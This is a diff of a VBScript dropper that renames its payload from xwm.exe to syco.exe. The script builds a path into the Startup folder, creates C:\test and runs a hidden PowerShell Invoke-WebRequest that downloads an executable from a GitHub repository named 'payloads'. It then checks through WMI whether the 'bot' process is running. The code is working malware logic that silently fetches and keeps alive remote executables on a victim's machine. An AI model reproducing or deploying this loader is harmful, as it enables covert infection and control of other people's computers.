@@ -7,7 +7,7 @@ strDestPath = objFSO.BuildPath(strStartupFolder, objFSO.GetFileName(strScriptPat
 
 ' Define the new directory on C: drive
 discordDir = "C:\test"
-botExePath = discordDir & "\xwm.exe" ' Path to bot.exe in the C:\test directory
+botExePath = discordDir & "\syco.exe" ' Path to bot.exe in the C:\test directory
 
 ' Create the discord directory if it doesn't exist
 If Not objFSO.FolderExists(discordDir) Then
@@ -21,13 +21,13 @@ End If
 
 ' Download bot.exe if not already downloaded
 If Not objFSO.FileExists(botExePath) Then
-    objShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4kr4m0/payloads/refs/heads/main/xwm.exe' -OutFile '" & botExePath & "'""", 0, True
+    objShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4kr4m0/payloads/refs/heads/main/syco.exe' -OutFile '" & botExePath & "'""", 0, True
 End If
 
 ' Loop to check if bot.exe is running
 Do While i <= 11
     ' Define the bot process name
-    botProcessName = "xwm.exe"
+    botProcessName = "syco.exe"
 
     ' Create a WMI object
     Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
